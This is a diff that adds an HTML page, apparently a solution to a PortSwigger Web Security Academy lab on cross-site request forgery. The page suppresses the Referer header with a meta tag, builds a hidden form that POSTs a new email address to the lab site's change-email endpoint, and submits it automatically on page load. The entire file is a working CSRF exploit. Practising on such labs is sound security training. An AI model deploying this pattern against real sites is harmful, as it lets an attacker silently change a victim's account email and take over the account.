@@ -1,0 +1,15 @@
+<html>
+  <head>
+    <meta name="referrer" content="no-referrer" /> <!-- Prevent sending the referrer header-->
+  </head>
+  <body>
+    <form action="https://0a7e001c03f0df5e80709922008a0025.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hello@gmail.com" />
+      <input type="submit" value="Submit request" />
+    </form>
+
+    <script>
+            document.forms[0].submit();
+    </script>
+  </body>
+</html>
